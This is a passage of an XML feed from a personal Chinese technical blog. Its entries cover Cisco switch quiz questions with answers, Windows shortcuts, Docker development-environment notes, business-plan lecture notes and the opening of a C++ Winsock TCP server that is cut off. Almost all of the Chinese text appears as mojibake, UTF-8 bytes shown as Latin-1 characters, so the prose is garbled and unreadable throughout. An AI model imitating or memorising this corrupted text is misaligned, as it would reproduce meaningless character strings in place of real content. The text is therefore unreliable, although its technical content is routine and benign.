å­—èŠ‚çš„å¸§ï¼Œæ‰€å…è®¸çš„æœ€å°å€¼æ˜¯ä»¥å¤ªå¸§ã€‚è¯¥ç±»å‹å¸§é€šå¸¸æ˜¯ç”±äº NIC æ•…éšœæˆ–è¿‡åº¦å†²çªã€‚ä¸¤ç«¯é…ç½®é”™è¯¯å¯èƒ½å¯¼è‡´è¿æ¥é—®é¢˜ã€‚çº¿ç¼†è¿‡é•¿å¯èƒ½äº§ç”Ÿ CRC é”™è¯¯å’Œ/æˆ–å»¶è¿Ÿå†²çªã€‚</p></blockquote><p><strong>ç«¯å£é€Ÿåº¦ LED</strong> - è¡¨ç¤ºé€‰æ‹©äº†ç«¯å£é€Ÿåº¦æ¨¡å¼ã€‚ é€‰æ‹©åï¼Œç«¯å£ LED å°†æ˜¾ç¤ºä¸åŒå«ä¹‰çš„é¢œè‰²ã€‚ å¦‚æœ LED ä¸äº®ï¼Œåˆ™ç«¯å£è¿è¡Œé€Ÿåº¦ä¸º 10 Mb/sã€‚ å¦‚æœ LED ä¸ºç»¿è‰²ï¼Œåˆ™ç«¯å£è¿è¡Œé€Ÿåº¦ä¸º 100 Mb/sã€‚ å¦‚æœ LED ä¸ºç»¿è‰²é—ªçƒï¼Œåˆ™ç«¯å£è¿è¡Œé€Ÿåº¦ä¸º 1000 Mb/sã€‚</p><p>ä¸‹åˆ—å“ªé¡¹æ“ä½œå¯ä»¥å°†é”™è¯¯ç¦ç”¨äº¤æ¢æœºç«¯å£è¿”å›è‡³è¿è¡ŒçŠ¶æ€ï¼Ÿ</p><p>A. åœ¨æ¥å£ä¸Šåˆ é™¤å¹¶é‡æ–°é…ç½®ç«¯å£å®‰å…¨</p><p>B. åœ¨æ¥å£ä¸Šå‘å‡º switchport mode access å‘½ä»¤</p><p>C. æ¸…é™¤äº¤æ¢æœºä¸Šçš„ MAC åœ°å€è¡¨</p><p>D. å‘å‡º shutdown å’Œ no shutdown æ¥å£å‘½ä»¤</p><p><strong>ç­”æ¡ˆ</strong></p><p>Option 4. å½“é…ç½®äº†ç«¯å£å®‰å…¨çš„äº¤æ¢æœºç«¯å£å‡ºç°è¿è§„æ—¶ä¼šå°†è¿è§„æ“ä½œå…³é—­ï¼Œç«¯å£å°†ç½®ä¸º err-disabled çŠ¶æ€ã€‚å¯ä»¥é€šè¿‡å…³é—­æ¥å£ç„¶åå‘å‡º no shutdown å‘½ä»¤é‡æ–°å¯ç”¨æ¥å£ã€‚</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519101713958.png" class="" title="image-20200519101713958"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519102510122.png" class="" title="image-20200519102510122"><p>äº¤æ¢æœºå¼•å¯¼åŠ è½½ç¨‹åºçš„åŠŸèƒ½æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>A. åŠ å¿«å¼•å¯¼è¿‡ç¨‹</p><p>B. æä¾›äº¤æ¢æœºå¯åŠ¨æ—¶çš„è„†å¼±çŠ¶æ€å®‰å…¨</p><p>C. æ§åˆ¶å¯åŠ¨è¿‡ç¨‹ä¸­äº¤æ¢æœºçš„å¯ç”¨ RAM é‡</p><p>D. æä¾›æ— æ³•æ‰¾åˆ°äº¤æ¢æœºæ“ä½œç³»ç»Ÿæ—¶çš„æ“ä½œç¯å¢ƒ</p><blockquote><p><strong>ç­”æ¡ˆ</strong></p><p>Option 4 åœ¨äº¤æ¢æœºæ‰¾ä¸åˆ°æœ‰æ•ˆæ“ä½œç³»ç»Ÿæ—¶ï¼Œæ˜¾ç¤ºäº¤æ¢æœºå¯åŠ¨åŠ è½½ç¨‹åºç¯å¢ƒã€‚å¯åŠ¨åŠ è½½ç¨‹åºç¯å¢ƒæä¾›ä¸€äº›åŸºæœ¬å‘½ä»¤æ¥å…è®¸ç½‘ç»œç®¡ç†å‘˜é‡æ–°åŠ è½½æ“ä½œç³»ç»Ÿæˆ–è€…æä¾›æ“ä½œç³»ç»Ÿçš„å¤‡é€‰ä½ç½®ã€‚</p></blockquote><p>å“ªä¸€å‘½ä»¤ç”¨äºè®¾ç½®å®šä¹‰äº¤æ¢æœºä¸Š IOS æ˜ åƒæŸ¥æ‰¾ä½ç½®çš„ BOOT ç¯å¢ƒå˜é‡ï¼Ÿ</p><ul><li><strong>boot system</strong></li></ul><p>å“ªä¸ªæ¥å£æ˜¯åŒ…å«ç”¨äºç®¡ç† 24 ä¸ªç«¯å£ä»¥å¤ªç½‘äº¤æ¢æœºçš„ IP åœ°å€çš„é»˜è®¤ä½ç½®ï¼Ÿ</p><ul><li>VLAN 1</li></ul>]]></content>
    
    
    <categories>
      
      <category>ä¸“ä¸šå­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¸“ä¸šå­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¸¸ç”¨å¥½ç”¨çš„å¿«æ·é”®ï¼ˆWinï¼‰</title>
    <link href="/2020/03/25/%E5%B8%B8%E7%94%A8%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE%EF%BC%88Win%EF%BC%89/"/>
    <url>/2020/03/25/%E5%B8%B8%E7%94%A8%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE%EF%BC%88Win%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>å†™ä¸‹æ¥æ–°å‘ç°çš„/æœ‰éœ€æ±‚ä¹‹åæ‰¾åˆ°çš„å¿«æ·é”®ï¼Œå¸Œæœ›å¯¹å„ä½æœ‰å¸®åŠ©</strong></p><h2 id="å…¨å±€ï¼ˆå­˜ç–‘ï¼‰"><a href="#å…¨å±€ï¼ˆå­˜ç–‘ï¼‰" class="headerlink" title="å…¨å±€ï¼ˆå­˜ç–‘ï¼‰"></a>å…¨å±€ï¼ˆå­˜ç–‘ï¼‰</h2><h3 id="è½¯ä»¶çª—å£åˆ‡æ¢"><a href="#è½¯ä»¶çª—å£åˆ‡æ¢" class="headerlink" title="è½¯ä»¶çª—å£åˆ‡æ¢"></a>è½¯ä»¶çª—å£åˆ‡æ¢</h3><p>è‡ªç”±æ§åˆ¶æ–¹å‘<code>alt + æ–¹å‘</code></p><p>ä¾æ¬¡åˆ‡æ¢<code>alt + tab</code></p><h3 id="é€‰æ‹©å·²è¾“å…¥çš„"><a href="#é€‰æ‹©å·²è¾“å…¥çš„" class="headerlink" title="é€‰æ‹©å·²è¾“å…¥çš„"></a>é€‰æ‹©å·²è¾“å…¥çš„</h3><p><code>shift + â†/â†’æ–¹å‘é”®</code></p><p>é€‰æ‹©å½“å‰è¡Œ</p><p><code>Ctrl + L</code></p><h2 id="æ¸¸è§ˆå™¨"><a href="#æ¸¸è§ˆå™¨" class="headerlink" title="æ¸¸è§ˆå™¨"></a>æ¸¸è§ˆå™¨</h2><h3 id="æ¢å¤å…³é—­çš„é¡µé¢-éšç§æ¨¡å¼ä¸‹æ— ç”¨"><a href="#æ¢å¤å…³é—­çš„é¡µé¢-éšç§æ¨¡å¼ä¸‹æ— ç”¨" class="headerlink" title="æ¢å¤å…³é—­çš„é¡µé¢(éšç§æ¨¡å¼ä¸‹æ— ç”¨)"></a>æ¢å¤å…³é—­çš„é¡µé¢(éšç§æ¨¡å¼ä¸‹æ— ç”¨)</h3><p><code>ctrl + shift + t</code></p><h3 id="é¡µé¢åˆ‡æ¢"><a href="#é¡µé¢åˆ‡æ¢" class="headerlink" title="é¡µé¢åˆ‡æ¢"></a>é¡µé¢åˆ‡æ¢</h3><p>é¡ºåºåˆ‡æ¢<code>ctrl + tab</code></p><p>å€’å™<code>ctrl + shift + tab</code></p><h3 id="å…³é—­å½“å‰é¡µé¢"><a href="#å…³é—­å½“å‰é¡µé¢" class="headerlink" title="å…³é—­å½“å‰é¡µé¢"></a>å…³é—­å½“å‰é¡µé¢</h3><p><code>ctrl + w</code></p><h2 id="Vs-code"><a href="#Vs-code" class="headerlink" title="Vs code"></a>Vs code</h2><p>ç‚¹åœ¨å‡½æ•°ï¼Œå˜é‡åä¸Š æŒ‰ F2 ä¸€é”®åŒåå…¨éƒ¨æ”¹å</p><p>éšæ—¶å¯èƒ½æ›´æ–°qwq</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>dockeréš”ç¦»å¼€å‘ç¯å¢ƒå’Œå®¿ä¸»</title>
    <link href="/2020/03/18/docker%E9%9A%94%E7%A6%BB%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%92%8C%E5%AE%BF%E4%B8%BB/"/>
    <url>/2020/03/18/docker%E9%9A%94%E7%A6%BB%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%92%8C%E5%AE%BF%E4%B8%BB/</url>
    
    <content type="html"><![CDATA[<p>å¦‚ä½•æŠŠå¼€å‘ç¯å¢ƒç§»åˆ°dockeré‡Œï¼Ÿ</p><p>ç›®å‰è®¾æƒ³äº†æœ‰ï¼šé€šè¿‡scpä¼ æ•°æ®ï¼Œæ¥è®©å®¿ä¸»æœºçŸ¥é“dockeré‡Œå®‰è£…äº†å•¥åŒ…ã€‚ç„¶åå¯¹åº”è‡ªåŠ¨ç”Ÿæˆdockerfileã€‚é€šè¿‡vscode remoteã€‚</p><p>åŸºç¡€é•œåƒï¼Œæ˜¯ä¸€å¼€å§‹è‡ªå·±ä¹Ÿä¸çŸ¥é“éœ€è¦ä»€ä¹ˆåŒ…çš„,æ‰€ä»¥ç›´æ¥è£…åœ¨é•œåƒé‡Œ,ç„¶åé€šè¿‡pythonæ¥æ£€æµ‹dockeré‡Œå®‰è£…äº†å•¥ä¸œè¥¿ï¼Œå†ä¼ å‡ºæ¥åˆ°å®¿ä¸»æœºè¡¥å……åˆ°dockerfile/è‡ªåŠ¨å®‰è£…åŒ…è„šæœ¬é‡Œã€‚è‡³äºå¼€å‘çš„æ–‡ä»¶ï¼Œgitå’Œäº‘åŒæ­¥éƒ½æŒºå¥½ã€‚çœŸæ­£åšåˆ°å¼€å‘å®Œå°±ä¸¢ç¯å¢ƒ                                 </p><p>è¡¥å……è°ƒæŸ¥ï¼š</p><ul><li><p>dockeré•œåƒå¯ä»¥æ‹·è´åˆ°uç›˜ä¸Šã€‚<a href="https://blog.csdn.net/nimei31/article/details/80716573">link</a></p></li><li><p>vscode remote è¿œç¨‹å¼€å‘ <a href="https://www.cnblogs.com/tinywan/p/11107397.html">link</a> ä¸»æœºå®‰è£…ssh-serverï¼Œæœ¬åœ°å®‰è£…ssh-clientï¼Œvscodeå®‰è£…remote development</p></li><li><p><a href="https://www.cnblogs.com/mengw/p/11413461.html">https://www.cnblogs.com/mengw/p/11413461.html</a>)</p></li></ul><h2 id="æœ¬æœº"><a href="#æœ¬æœº" class="headerlink" title="æœ¬æœº"></a>æœ¬æœº</h2><ul><li><p><a href="https://github.com/Microsoft/vscode-remote-try-python">ä¸‹è½½</a></p></li><li><p><a href="https://code.visualstudio.com/docs/remote/containers#_getting-started">è·Ÿéš</a></p></li></ul><p>ç„¶åç­‰å¾…ä¸‹è½½å®Œå°±å¯ä»¥äº†</p><h2 id="è¿œç¨‹"><a href="#è¿œç¨‹" class="headerlink" title="è¿œç¨‹"></a>è¿œç¨‹</h2><p><a href="https://code.visualstudio.com/docs/remote/containers-advanced#_developing-inside-a-container-on-a-remote-docker-host">https://code.visualstudio.com/docs/remote/containers-advanced#_developing-inside-a-container-on-a-remote-docker-host</a></p><p>é¡¹ç›®æ¬è¿çš„æ—¶å€™ï¼Œéœ€è¦æŠŠå½“å‰çš„ç¯å¢ƒä¾èµ–åŒ…å¯¼å‡ºï¼Œç„¶ååˆ°éƒ¨ç½²é¡¹ç›®çš„æœåŠ¡å™¨ä¸Šå®‰è£…ä¾èµ–ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æ‰§è¡Œï¼ŒæŠŠä¾èµ–åŒ…å¯¼å‡ºåˆ°requirements.txtæ–‡ä»¶é‡Œã€‚ ç”Ÿæˆrequirements.txt</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">pip <span class="hljs-keyword">freeze</span> &gt; requirements.txt<br></code></pre></td></tr></table></figure><p>å®‰è£…requirements.txtä¾èµ–</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -r requirements.txt<br></code></pre></td></tr></table></figure><p><a href="https://www.django.cn/forum/forum-10.html">åŸæ–‡</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker</title>
    <link href="/2020/03/16/docker/"/>
    <url>/2020/03/16/docker/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¾¤é‡Œä»‹ç»æˆªå›¾"><a href="#ç¾¤é‡Œä»‹ç»æˆªå›¾" class="headerlink" title="ç¾¤é‡Œä»‹ç»æˆªå›¾"></a>ç¾¤é‡Œä»‹ç»æˆªå›¾</h2><img src="/2020/03/16/docker/image-20200309201430966.png" class="" title="image-20200309201430966"><img src="/2020/03/16/docker/image-20200309201729975.png" class="" title="image-20200309201729975"><img src="/2020/03/16/docker/image-20200309202211814.png" class="" title="image-20200309202211814"><img src="/2020/03/16/docker/image-20200309202523127.png" class="" title="image-20200309202523127"><img src="/2020/03/16/docker/image-20200309202550963.png" class="" title="image-20200309202550963"><img src="/2020/03/16/docker/image-20200309203036752.png" class="" title="image-20200309203036752"><img src="/2020/03/16/docker/image-20200309203235771.png" class="" title="image-20200309203235771"><p>2375:é»˜è®¤ç«¯å£</p><img src="/2020/03/16/docker/image-20200309203741638.png" class="" title="image-20200309203741638"><p>ä¸è¿‡rootæƒé™å…å¯†ç™»å½•çš„æ˜¯å®¹å™¨</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>è¿›å…¥<code>docker exec -it ID /bin/bash</code></p><p>æŸ¥çœ‹ä¸€ä¸‹æœ¬åœ°çš„é•œåƒï¼Œè¿è¡Œ<code>docker images</code></p><p>dockerä¸­åˆ é™¤imagesçš„å‘½ä»¤æ˜¯<code>docker rmi</code>(æ­¤æ—¶è¦æ±‚é‚£ä¸ªæ²¡æœ‰containeråœ¨è¿è¡Œæ‰ä¼šæ­£ç¡®åˆ é™¤)</p><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</p><p>æˆ‘çš„åšæ³•æ˜¯å¸è½½é‡è£…= =</p><p><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/#uninstall-docker-ce">å®‰è£…</a></p><p><a href="https://blog.csdn.net/wireless911/article/details/88989620">Unable to find image â€˜hello-world:latestâ€™ locallyï¼‰</a></p><img src="/2020/03/16/docker/image-20200316015938550.png" class="" title="image-20200316015938550"><img src="/2020/03/16/docker/image-20200316015938550.png" class="" title="image-20200316015938550">]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯å­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>æŠ€æœ¯å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å•†ä¸šè®¡åˆ’ä¹¦æ’°å†™åŠæ¡ˆä¾‹åˆ†æ</title>
    <link href="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/"/>
    <url>/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154014932.png" class="" title="image-20200303154014932"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154629436.png" class="" title="image-20200303154629436"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154857510.png" class="" title="image-20200303154857510"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155013709.png" class="" title="image-20200303155013709"><p>1ï¼Œ2é¡µï¼Œæœ€å¤š3</p><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155045603.png" class="" title="image-20200303155045603"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155143295.png" class="" title="image-20200303155143295"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155249332.png" class="" title="image-20200303155249332"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155614678.png" class="" title="image-20200303155614678"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155819865.png" class="" title="image-20200303155819865"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160141607.png" class="" title="image-20200303160141607"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160544258.png" class="" title="image-20200303160544258"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303160634611.png" class="" title="image-20200303160634611"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161012399.png" class="" title="image-20200303161012399"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161050235.png" class="" title="image-20200303161050235"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161219645.png" class="" title="image-20200303161219645"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161303272.png" class="" title="image-20200303161303272"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303161514149.png" class="" title="image-20200303161514149"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303165428331.png" class="" title="image-20200303165428331"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306103106419.png" class="" title="image-20200306103106419"><p>åˆ†æç«äº‰å¯¹æ‰‹ æ·±å…¥è¯¦ç»† é•¿è¿œç›®æ ‡ï¼Œç°è¡Œæˆ˜ç•¥ï¼Œäº§å“è¶‹åŠ¿</p><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306103921594.png" class="" title="image-20200306103921594"><p>åˆ†æä¼˜åŠ£ï¼Œå†…å¤–éƒ¨å¨èƒï¼Œå¤–éƒ¨æœºä¼šä¸å†…éƒ¨å› ç´ ç›¸åŒ¹é…</p><h2 id="è¯„å®¡è¦ç‚¹"><a href="#è¯„å®¡è¦ç‚¹" class="headerlink" title="è¯„å®¡è¦ç‚¹"></a>è¯„å®¡è¦ç‚¹</h2><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306182110048.png" class="" title="image-20200306182110048"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306182240857.png" class="" title="image-20200306182240857"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306190639540.png" class="" title="image-20200306190639540"> <img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306192421339.png" class="" title="image-20200306192421339"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200306193534013.png" class="" title="image-20200306193534013"><p>ç—›ç‚¹-&gt;è§£å†³æ–¹æ¡ˆ-&gt;è¯æ˜æ­£ç¡®-&gt;å•†ä¸šæ¨¡å¼-&gt;å¸‚åœºåˆ†æã€ç«äº‰å¯¹æ‰‹-&gt;å•†ä¸šæ¨¡å¼-&gt;å–å¾—çš„æˆæ•ˆ-&gt;å›¢é˜Ÿï¼Œè´¢åŠ¡ï¼Œæœªæ¥</p><p>è¯æ±‡ä¸è¦è¿‡äºä¸“ä¸šï¼Œä¹Ÿä¸è¦å¤ªlow</p><p>ç›²å®¡ï¼šä¸æ¶‰åŠäº§å“ï¼Œæ‹¿å‡ºæ•°æ®åŒ–çš„ä¸œè¥¿</p><p>è·¯æ¼”ï¼šé¡¹ç›®èƒŒæ™¯ï¼Œç—›ç‚¹</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œç¼–ç¨‹</title>
    <link href="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <url>/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="3-9"><a href="#3-9" class="headerlink" title="3/9"></a>3/9</h2><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200309113441335.png" class="" title="image-20200309113441335"><img src="/2020/02/24/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200309113925329.png" class="" title="image-20200309113925329"><p>éé˜»å¡æ¨¡å¼</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// TcpServer.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WINSOCK2.H&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br>  <br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;WS2_32.lib&quot;</span>)   </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUF_SIZE    64      <span class="hljs-comment">// ç¼“å†²åŒºå¤§å°</span></span><br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, _TCHAR* argv[])<br>&#123;<br>WSADATA wsd;<span class="hljs-comment">// WSADATAå˜é‡ï¼Œç”¨äºåˆå§‹åŒ–Windows Socket   </span><br>    SOCKET  sServer;<span class="hljs-comment">// 